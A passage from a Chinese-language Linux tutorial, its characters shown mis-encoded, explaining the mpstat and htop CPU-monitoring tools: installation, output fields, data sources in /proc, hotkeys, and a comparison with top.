<li><strong>å†å²æ•°æ®</strong>ï¼šå¯ä»¥æ˜¾ç¤ºå†å²ç»Ÿè®¡ä¿¡æ¯</li>
</ol>
<p><strong>mpstat çš„å®‰è£…</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install sysstat

<span class="hljs-comment"># CentOS/RHEL</span>
yum install sysstat

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
mpstat --version
</code></pre>
<h3 data-id="heading-28">3.2 mpstat çš„è¾“å‡ºè¯¦è§£</h3>
<p><strong>åŸºæœ¬ç”¨æ³•</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ˜¾ç¤ºæ‰€æœ‰ CPU çš„ç»Ÿè®¡ä¿¡æ¯</span>
mpstat

<span class="hljs-comment"># æ¯ 2 ç§’æ›´æ–°ä¸€æ¬¡ï¼Œå…± 5 æ¬¡</span>
mpstat 2 5

<span class="hljs-comment"># æ˜¾ç¤ºæ¯ä¸ª CPU æ ¸å¿ƒçš„ç»Ÿè®¡ä¿¡æ¯</span>
mpstat -P ALL

<span class="hljs-comment"># æ˜¾ç¤ºç‰¹å®š CPU æ ¸å¿ƒçš„ç»Ÿè®¡ä¿¡æ¯</span>
mpstat -P 0,1
</code></pre>
<p><strong>mpstat è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">147</span> (mr536)  <span class="hljs-number">12</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2025</span>  _aarch64<span class="hljs-number">_</span>  (<span class="hljs-number">4</span> CPU)

<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>     CPU    %usr   %nice    %sys   %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>     all    <span class="hljs-number">5.20</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">2.10</span>      <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">92.50</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">0</span>    <span class="hljs-number">6.00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">2.50</span>      <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">20</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">91.30</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">1</span>    <span class="hljs-number">4.50</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">1.80</span>      <span class="hljs-number">0</span>.<span class="hljs-number">20</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">93.50</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">2</span>    <span class="hljs-number">5.80</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">2.20</span>      <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">91.80</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">3</span>    <span class="hljs-number">4.30</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">1.90</span>      <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">93.60</span>
</code></pre>
<p><strong>å­—æ®µè¯¦ç»†è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>CPU</strong>ï¼š</p>
<ul>
<li><strong><code>all</code></strong>ï¼šæ‰€æœ‰ CPU çš„å¹³å‡å€¼</li>
<li><strong><code>0, 1, 2, 3</code></strong>ï¼šå„ä¸ª CPU æ ¸å¿ƒçš„ç¼–å·</li>
</ul>
</li>
<li>
<p><strong>%usrï¼ˆUserï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç”¨æˆ·ç©ºé—´ CPU ä½¿ç”¨ç‡</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šç”¨æˆ·ç©ºé—´è¿›ç¨‹çš„ CPU æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%us</code></li>
</ul>
</li>
<li>
<p><strong>%nice</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šnice è°ƒæ•´åçš„ç”¨æˆ·ç©ºé—´ CPU ä½¿ç”¨ç‡</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šnice å€¼ä¸ä¸º 0 çš„è¿›ç¨‹çš„ CPU æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%ni</code></li>
</ul>
</li>
<li>
<p><strong>%sysï¼ˆSystemï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå†…æ ¸ç©ºé—´ CPU ä½¿ç”¨ç‡</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šå†…æ ¸ä»£ç çš„ CPU æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%sy</code></li>
</ul>
</li>
<li>
<p><strong>%iowaitï¼ˆI/O Waitï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç­‰å¾… I/O çš„ CPU ç™¾åˆ†æ¯”</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šCPU ç©ºé—²ä¸”ç­‰å¾… I/O å®Œæˆçš„æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%wa</code></li>
<li><strong>æ³¨æ„</strong>ï¼šiowait é«˜å¯èƒ½è¡¨ç¤º I/O ç“¶é¢ˆ</li>
</ul>
</li>
<li>
<p><strong>%irqï¼ˆInterruptï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç¡¬ä»¶ä¸­æ–­ CPU ç™¾åˆ†æ¯”</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šå¤„ç†ç¡¬ä»¶ä¸­æ–­çš„æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%hi</code></li>
</ul>
</li>
<li>
<p><strong>%softï¼ˆSoftware Interruptï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè½¯ä»¶ä¸­æ–­ CPU ç™¾åˆ†æ¯”</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šå¤„ç†è½¯ä»¶ä¸­æ–­çš„æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%si</code></li>
</ul>
</li>
<li>
<p><strong>%stealï¼ˆSteal Timeï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè™šæ‹ŸåŒ–ç¯å¢ƒä¸­è¢«å…¶ä»–è™šæ‹Ÿæœºå ç”¨çš„ CPU ç™¾åˆ†æ¯”</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šè¢« hypervisor å ç”¨çš„ CPU æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%st</code></li>
<li><strong>æ³¨æ„</strong>ï¼šsteal é«˜è¡¨ç¤ºè™šæ‹Ÿæœºèµ„æºä¸è¶³</li>
</ul>
</li>
<li>
<p><strong>%guestï¼ˆGuestï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šè¿è¡Œè™šæ‹Ÿæœºçš„ CPU ç™¾åˆ†æ¯”</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šè¿è¡Œè™šæ‹Ÿæœºçš„æ—¶é—´ / æ€»æ—¶é—´</li>
</ul>
</li>
<li>
<p><strong>%gniceï¼ˆGuest Niceï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šnice è°ƒæ•´åçš„è™šæ‹Ÿæœº CPU ç™¾åˆ†æ¯”</li>
</ul>
</li>
<li>
<p><strong>%idleï¼ˆIdleï¼‰</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç©ºé—² CPU ç™¾åˆ†æ¯”</li>
<li><strong>è®¡ç®—æ–¹å¼</strong>ï¼šCPU ç©ºé—²æ—¶é—´ / æ€»æ—¶é—´</li>
<li><strong>ä¸ top çš„å…³ç³»</strong>ï¼šå¯¹åº” top çš„ <code>%id</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-29">3.3 mpstat çš„é«˜çº§ç”¨æ³•</h3>
<p><strong>æ˜¾ç¤ºä¸­æ–­ç»Ÿè®¡</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ˜¾ç¤ºæ¯ä¸ª CPU çš„ä¸­æ–­ç»Ÿè®¡</span>
mpstat -I SUM

<span class="hljs-comment"># æ˜¾ç¤ºç‰¹å®šä¸­æ–­çš„ç»Ÿè®¡</span>
mpstat -I SCPU
</code></pre>
<p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">Linux 5.15.147 (mr536)  12/15/2025  _aarch64_  (4 CPU)

<span class="hljs-section">10:30:45     CPU    intr/s</span>
<span class="hljs-section">10:30:45     all   1234.56</span>
<span class="hljs-section">10:30:45       0    345.67</span>
<span class="hljs-section">10:30:45       1    234.56</span>
<span class="hljs-section">10:30:45       2    345.67</span>
<span class="hljs-section">10:30:45       3    308.66</span>
</code></pre>
<p><strong>æ˜¾ç¤º CPU é¢‘ç‡</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ˜¾ç¤º CPU é¢‘ç‡ä¿¡æ¯ï¼ˆå¦‚æœæ”¯æŒï¼‰</span>
mpstat -f
</code></pre>
<p><strong>JSON æ ¼å¼è¾“å‡º</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä»¥ JSON æ ¼å¼è¾“å‡ºï¼ˆæŸäº›ç‰ˆæœ¬æ”¯æŒï¼‰</span>
mpstat -o JSON
</code></pre>
<h3 data-id="heading-30">3.4 mpstat çš„æ•°æ®æ¥æº</h3>
<p><strong>mpstat ä» /proc/stat è¯»å–æ•°æ®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/stat
<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># cpu  12345 0 5678 89012 1234 0 567 0 0 0</span>
<span class="hljs-comment"># cpu0 1234 0 567 8901 123 0 56 0 0 0</span>
<span class="hljs-comment"># cpu1 1234 0 567 8901 123 0 56 0 0 0</span>
<span class="hljs-comment"># ...</span>
</code></pre>
<p><strong>/proc/stat å­—æ®µå«ä¹‰</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">cpu  <span class="hljs-keyword">user</span> nice <span class="hljs-keyword">system</span> idle iowait irq softirq steal guest guest_nice
</code></pre>
<ul>
<li><strong>user</strong>ï¼šç”¨æˆ·ç©ºé—´ CPU æ—¶é—´ï¼ˆjiffiesï¼‰</li>
<li><strong>nice</strong>ï¼šnice è°ƒæ•´åçš„ç”¨æˆ·ç©ºé—´ CPU æ—¶é—´</li>
<li><strong>system</strong>ï¼šå†…æ ¸ç©ºé—´ CPU æ—¶é—´</li>
<li><strong>idle</strong>ï¼šç©ºé—² CPU æ—¶é—´</li>
<li><strong>iowait</strong>ï¼šç­‰å¾… I/O çš„ CPU æ—¶é—´</li>
<li><strong>irq</strong>ï¼šç¡¬ä»¶ä¸­æ–­ CPU æ—¶é—´</li>
<li><strong>softirq</strong>ï¼šè½¯ä»¶ä¸­æ–­ CPU æ—¶é—´</li>
<li><strong>steal</strong>ï¼šè¢«å…¶ä»–è™šæ‹Ÿæœºå ç”¨çš„ CPU æ—¶é—´</li>
<li><strong>guest</strong>ï¼šè¿è¡Œè™šæ‹Ÿæœºçš„ CPU æ—¶é—´</li>
<li><strong>guest_nice</strong>ï¼šnice è°ƒæ•´åçš„è™šæ‹Ÿæœº CPU æ—¶é—´</li>
</ul>
<p><strong>è®¡ç®—æ–¹å¼</strong>ï¼š</p>
<p>mpstat è¯»å–ä¸¤æ¬¡ <code>/proc/stat</code>ï¼Œè®¡ç®—å·®å€¼ï¼Œç„¶åé™¤ä»¥æ—¶é—´é—´éš”ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">%<span class="hljs-attr">usr</span> = (user2 - user1) / (total2 - total1) * <span class="hljs-number">100</span>%
</code></pre>
<hr/>
<h2 data-id="heading-31">4. htop å·¥å…·è¯¦è§£</h2>
<h3 data-id="heading-32">4.1 htop æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>htop çš„å®šä¹‰</strong>ï¼š</p>
<p>htop æ˜¯ top çš„å¢å¼ºç‰ˆæœ¬ï¼Œæä¾›äº†æ›´å‹å¥½çš„ç”¨æˆ·ç•Œé¢å’Œæ›´å¼ºå¤§çš„åŠŸèƒ½ã€‚</p>
<p><strong>htop çš„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å½©è‰²æ˜¾ç¤º</strong>ï¼šä½¿ç”¨é¢œè‰²åŒºåˆ†ä¸åŒç±»å‹çš„è¿›ç¨‹</li>
<li><strong>é¼ æ ‡æ”¯æŒ</strong>ï¼šæ”¯æŒé¼ æ ‡æ“ä½œ</li>
<li><strong>æ ‘çŠ¶æ˜¾ç¤º</strong>ï¼šå¯ä»¥æ˜¾ç¤ºè¿›ç¨‹æ ‘</li>
<li><strong>æ›´ç›´è§‚</strong>ï¼šç•Œé¢æ›´å‹å¥½ï¼Œä¿¡æ¯æ›´æ¸…æ™°</li>
<li><strong>å®æ—¶æœç´¢</strong>ï¼šæ”¯æŒå®æ—¶æœç´¢è¿›ç¨‹</li>
</ol>
<p><strong>htop çš„å®‰è£…</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install htop

<span class="hljs-comment"># CentOS/RHEL</span>
yum install htop

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
htop --version
</code></pre>
<h3 data-id="heading-33">4.2 htop çš„ç•Œé¢è¯¦è§£</h3>
<p><strong>htop çš„ç•Œé¢å¸ƒå±€</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">  1  <span class="hljs-section">[|||||||||||||||||||                   49.2%]</span>   Tasks: 285, 1 thr<span class="hljs-comment">; 1 running</span>
  2  <span class="hljs-section">[|||||||||||||||||||||||||||||||||||   78.5%]</span>   Load average: 0.52 0.58 0.61
  3  <span class="hljs-section">[|||||||||||||||||||||||||||||||||||   82.3%]</span>   Uptime: 5 days, 02:15:30
  4  <span class="hljs-section">[|||||||||||||||||||||||||||||||||||   91.2%]</span>
  Mem<span class="hljs-section">[|||||||||||||||||||||||||||||||||||2.0G/8.0G]</span>
  Swp<span class="hljs-section">[                                                         0K/4.0G]</span>

  PID USER      PRI  NI   VIRT   RES   SHR CPU% MEM%   TIME+  Command
 1234 root       20   0  1000M   512M  256M  5.2  6.2 10:30.45 test
</code></pre>
<p><strong>ç•Œé¢å…ƒç´ è¯¦è§£</strong>ï¼š</p>
<ol>
<li>
<p><strong>CPU ä½¿ç”¨ç‡æ¡</strong>ï¼š</p>
<ul>
<li><strong>æ˜¾ç¤º</strong>ï¼šæ¯ä¸ª CPU æ ¸å¿ƒçš„ä½¿ç”¨ç‡</li>
<li><strong>é¢œè‰²</strong>ï¼š
<ul>
<li><strong>ç»¿è‰²</strong>ï¼šç”¨æˆ·ç©ºé—´</li>
<li><strong>çº¢è‰²</strong>ï¼šå†…æ ¸ç©ºé—´</li>
<li><strong>è“è‰²</strong>ï¼šä½ä¼˜å…ˆçº§ï¼ˆniceï¼‰</li>
<li><strong>é»„è‰²</strong>ï¼šI/O ç­‰å¾…</li>
</ul>
</li>
<li><strong>ä½œç”¨</strong>ï¼šç›´è§‚æ˜¾ç¤ºæ¯ä¸ª CPU çš„è´Ÿè½½</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ä½¿ç”¨æ¡</strong>ï¼š</p>
<ul>
<li><strong>æ˜¾ç¤º</strong>ï¼šå†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li><strong>é¢œè‰²</strong>ï¼š
<ul>
<li><strong>ç»¿è‰²</strong>ï¼šå·²ä½¿ç”¨å†…å­˜</li>
<li><strong>è“è‰²</strong>ï¼šç¼“å†²åŒºå’Œç¼“å­˜</li>
</ul>
</li>
<li><strong>ä½œç”¨</strong>ï¼šç›´è§‚æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ</li>
</ul>
</li>
<li>
<p><strong>äº¤æ¢åˆ†åŒºæ¡</strong>ï¼š</p>
<ul>
<li><strong>æ˜¾ç¤º</strong>ï¼šäº¤æ¢åˆ†åŒºä½¿ç”¨æƒ…å†µ</li>
<li><strong>é¢œè‰²</strong>ï¼šé€šå¸¸ä¸ºç°è‰²æˆ–é»„è‰²</li>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾ç¤ºäº¤æ¢åˆ†åŒºçš„ä½¿ç”¨æƒ…å†µ</li>
</ul>
</li>
<li>
<p><strong>è¿›ç¨‹åˆ—è¡¨</strong>ï¼š</p>
<ul>
<li><strong>æ˜¾ç¤º</strong>ï¼šä¸ top ç±»ä¼¼çš„è¿›ç¨‹ä¿¡æ¯</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼šæ”¯æŒé¼ æ ‡æ“ä½œå’Œå®æ—¶æœç´¢</li>
</ul>
</li>
</ol>
<h3 data-id="heading-34">4.3 htop çš„äº¤äº’å‘½ä»¤</h3>
<p><strong>å¸¸ç”¨äº¤äº’å‘½ä»¤</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ’åºå‘½ä»¤</strong>ï¼š</p>
<ul>
<li><strong><code>F6</code></strong>ï¼šé€‰æ‹©æ’åºå­—æ®µ</li>
<li><strong><code>F5</code></strong>ï¼šæ ‘çŠ¶æ˜¾ç¤º</li>
<li><strong><code>t</code></strong>ï¼šåˆ‡æ¢æ ‘çŠ¶æ˜¾ç¤º</li>
</ul>
</li>
<li>
<p><strong>è¿›ç¨‹æ“ä½œ</strong>ï¼š</p>
<ul>
<li><strong><code>F9</code></strong>ï¼šæ€æ­»è¿›ç¨‹</li>
<li><strong><code>F7</code></strong>ï¼šé™ä½è¿›ç¨‹ä¼˜å…ˆçº§ï¼ˆå¢åŠ  nice å€¼ï¼‰</li>
<li><strong><code>F8</code></strong>ï¼šæé«˜è¿›ç¨‹ä¼˜å…ˆçº§ï¼ˆå‡å°‘ nice å€¼ï¼‰</li>
<li><strong><code>k</code></strong>ï¼šæ€æ­»è¿›ç¨‹ï¼ˆéœ€è¦è¾“å…¥ PIDï¼‰</li>
</ul>
</li>
<li>
<p><strong>æ˜¾ç¤ºé€‰é¡¹</strong>ï¼š</p>
<ul>
<li><strong><code>F2</code></strong>ï¼šè®¾ç½®ç•Œé¢</li>
<li><strong><code>F3</code></strong>ï¼šæœç´¢è¿›ç¨‹</li>
<li><strong><code>F4</code></strong>ï¼šè¿‡æ»¤è¿›ç¨‹</li>
<li><strong><code>F10</code></strong>ï¼šé€€å‡º</li>
</ul>
</li>
<li>
<p><strong>å…¶ä»–å‘½ä»¤</strong>ï¼š</p>
<ul>
<li><strong><code>h</code></strong>ï¼šæ˜¾ç¤ºå¸®åŠ©</li>
<li><strong><code>q</code></strong>ï¼šé€€å‡º htop</li>
<li><strong><code>u</code></strong>ï¼šæŒ‰ç”¨æˆ·è¿‡æ»¤</li>
<li><strong><code>H</code></strong>ï¼šåˆ‡æ¢æ˜¾ç¤ºçº¿ç¨‹</li>
<li><strong><code>P</code></strong>ï¼šæŒ‰ CPU æ’åº</li>
<li><strong><code>M</code></strong>ï¼šæŒ‰å†…å­˜æ’åº</li>
</ul>
</li>
</ol>
<h3 data-id="heading-35">4.4 htop çš„é«˜çº§åŠŸèƒ½</h3>
<p><strong>æ ‘çŠ¶æ˜¾ç¤º</strong>ï¼š</p>
<p>htop å¯ä»¥ä»¥æ ‘çŠ¶ç»“æ„æ˜¾ç¤ºè¿›ç¨‹ï¼Œæ˜¾ç¤ºè¿›ç¨‹ä¹‹é—´çš„çˆ¶å­å…³ç³»ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml">  <span class="hljs-string">PID</span> <span class="hljs-string">USER</span>      <span class="hljs-string">PRI</span>  <span class="hljs-string">NI</span>   <span class="hljs-string">VIRT</span>   <span class="hljs-string">RES</span>   <span class="hljs-string">SHR</span> <span class="hljs-string">CPU%</span> <span class="hljs-string">MEM%</span>   <span class="hljs-string">TIME+</span>  <span class="hljs-string">Command</span>
    <span class="hljs-number">1</span> <span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">100M</span>    <span class="hljs-string">10M</span>   <span class="hljs-string">5M</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">0</span><span class="hljs-string">:05.30</span> <span class="hljs-string">systemd</span>
 <span class="hljs-number">1234 </span><span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">200M</span>    <span class="hljs-string">50M</span>  <span class="hljs-string">20M</span>  <span class="hljs-number">2.5</span>  <span class="hljs-number">0.6</span>  <span class="hljs-number">0</span><span class="hljs-string">:10.45</span> <span class="hljs-string">â”œâ”€</span> <span class="hljs-string">systemd-logind</span>
 <span class="hljs-number">1235 </span><span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">150M</span>    <span class="hljs-string">30M</span>  <span class="hljs-string">15M</span>  <span class="hljs-number">1.2</span>  <span class="hljs-number">0.4</span>  <span class="hljs-number">0</span><span class="hljs-string">:05.20</span> <span class="hljs-string">â”‚</span>  <span class="hljs-string">â””â”€</span> <span class="hljs-string">dbus-daemon</span>
 <span class="hljs-number">1236 </span><span class="hljs-string">root</span>       <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-string">300M</span>   <span class="hljs-string">100M</span>  <span class="hljs-string">50M</span>  <span class="hljs-number">5.2</span>  <span class="hljs-number">1.2</span>  <span class="hljs-number">0</span><span class="hljs-string">:15.30</span> <span class="hljs-string">â””â”€</span> <span class="hljs-string">NetworkManager</span>
</code></pre>
<p><strong>å®æ—¶æœç´¢</strong>ï¼š</p>
<p>æŒ‰ <code>F3</code> å¯ä»¥æœç´¢è¿›ç¨‹ï¼Œæ”¯æŒå®æ—¶è¿‡æ»¤ã€‚</p>
<p><strong>é¢œè‰²ç¼–ç </strong>ï¼š</p>
<p>htop ä½¿ç”¨é¢œè‰²ç¼–ç ä¸åŒç±»å‹çš„è¿›ç¨‹ï¼š</p>
<ul>
<li><strong>ç»¿è‰²</strong>ï¼šæ™®é€šè¿›ç¨‹</li>
<li><strong>è“è‰²</strong>ï¼šä½ä¼˜å…ˆçº§è¿›ç¨‹</li>
<li><strong>çº¢è‰²</strong>ï¼šå†…æ ¸çº¿ç¨‹</li>
<li><strong>é»„è‰²</strong>ï¼šI/O ç­‰å¾…</li>
</ul>
<p><strong>è‡ªå®šä¹‰æ˜¾ç¤º</strong>ï¼š</p>
<p>æŒ‰ <code>F2</code> å¯ä»¥è‡ªå®šä¹‰ç•Œé¢æ˜¾ç¤ºï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>æ˜¾ç¤ºå“ªäº›å­—æ®µ</li>
<li>é¢œè‰²æ–¹æ¡ˆ</li>
<li>æ›´æ–°å»¶è¿Ÿ</li>
</ul>
<h3 data-id="heading-36">4.5 htop çš„æ•°æ®æ¥æº</h3>
<p><strong>htop çš„æ•°æ®æ¥æºä¸ top ç›¸åŒ</strong>ï¼š</p>
<ul>
<li><code>/proc/stat</code>ï¼šç³»ç»Ÿç»Ÿè®¡ä¿¡æ¯</li>
<li><code>/proc/[pid]/stat</code>ï¼šè¿›ç¨‹ç»Ÿè®¡ä¿¡æ¯</li>
<li><code>/proc/[pid]/status</code>ï¼šè¿›ç¨‹è¯¦ç»†çŠ¶æ€</li>
<li><code>/proc/meminfo</code>ï¼šå†…å­˜ä¿¡æ¯</li>
<li><code>/proc/loadavg</code>ï¼šç³»ç»Ÿè´Ÿè½½</li>
</ul>
<p><strong>htop çš„ä¼˜åŠ¿</strong>ï¼š</p>
<ol>
<li><strong>æ›´å‹å¥½çš„ç•Œé¢</strong>ï¼šå½©è‰²æ˜¾ç¤ºï¼Œæ›´ç›´è§‚</li>
<li><strong>é¼ æ ‡æ”¯æŒ</strong>ï¼šå¯ä»¥ç”¨é¼ æ ‡æ“ä½œ</li>
<li><strong>å®æ—¶æœç´¢</strong>ï¼šå¿«é€ŸæŸ¥æ‰¾è¿›ç¨‹</li>
<li><strong>æ ‘çŠ¶æ˜¾ç¤º</strong>ï¼šæ˜¾ç¤ºè¿›ç¨‹å…³ç³»</li>
</ol>
<hr/>
<h2 data-id="heading-37">5. å·¥å…·å¯¹æ¯”å’Œé€‰æ‹©</h2>
<h3 data-id="heading-38">5.1 åŠŸèƒ½å¯¹æ¯”</h3>





















































<table><thead><tr><th>ç‰¹æ€§</th><th>top</th><th>mpstat</th><th>htop</th></tr></thead><tbody><tr><td><strong>ç•Œé¢ç±»å‹</strong></td><td>æ–‡æœ¬</td><td>å‘½ä»¤è¡Œ</td><td>å½©è‰²æ–‡æœ¬</td></tr><tr><td><strong>é¼ æ ‡æ”¯æŒ</strong></td><td>å¦</td><td>å¦</td><td>æ˜¯</td></tr><tr><td><strong>CPU æ ¸å¿ƒæ˜¾ç¤º</strong></td><td>æ±‡æ€»/æ‰€æœ‰</td><td>æ¯ä¸ªæ ¸å¿ƒ</td><td>æ¯ä¸ªæ ¸å¿ƒ</td></tr><tr><td><strong>è¿›ç¨‹ç®¡ç†</strong></td><td>æ˜¯</td><td>å¦</td><td>æ˜¯</td></tr><tr><td><strong>è„šæœ¬å‹å¥½</strong></td><td>æ˜¯ï¼ˆæ‰¹å¤„ç†æ¨¡å¼ï¼‰</td><td>æ˜¯</td><td>å¦</td></tr><tr><td><strong>èµ„æºå ç”¨</strong></td><td>ä½</td><td>ä½</td><td>ä¸­ç­‰</td></tr><tr><td><strong>å­¦ä¹ æ›²çº¿</strong></td><td>ä¸­ç­‰</td><td>ä½</td><td>ä½</td></tr></tbody></table>
<h3 data-id="heading-39">5.2 ä½¿ç”¨åœºæ™¯</h3>
<p><strong>top é€‚åˆ</strong>ï¼š</p>
<ol>
<li><strong>ç”Ÿäº§ç¯å¢ƒ</strong>ï¼šèµ„æºå ç”¨å°ï¼Œç¨³å®šå¯é </li>
<li><strong>è¿œç¨‹ç»ˆç«¯</strong>ï¼šä¸éœ€è¦å›¾å½¢ç•Œé¢æ”¯æŒ</li>
<li><strong>è„šæœ¬è‡ªåŠ¨åŒ–</strong>ï¼šæ‰¹å¤„ç†æ¨¡å¼é€‚åˆè„šæœ¬</li>
<li><strong>å¿«é€ŸæŸ¥çœ‹</strong>ï¼šç®€å•ç›´æ¥</li>
</ol>
<p><strong>mpstat é€‚åˆ</strong>ï¼š</p>
<ol>
<li><strong>CPU åˆ†æ</strong>ï¼šéœ€è¦è¯¦ç»†çš„ CPU ç»Ÿè®¡ä¿¡æ¯</li>
<li><strong>å¤šæ ¸ç³»ç»Ÿ</strong>ï¼šéœ€è¦æŸ¥çœ‹æ¯ä¸ªæ ¸å¿ƒçš„è´Ÿè½½</li>
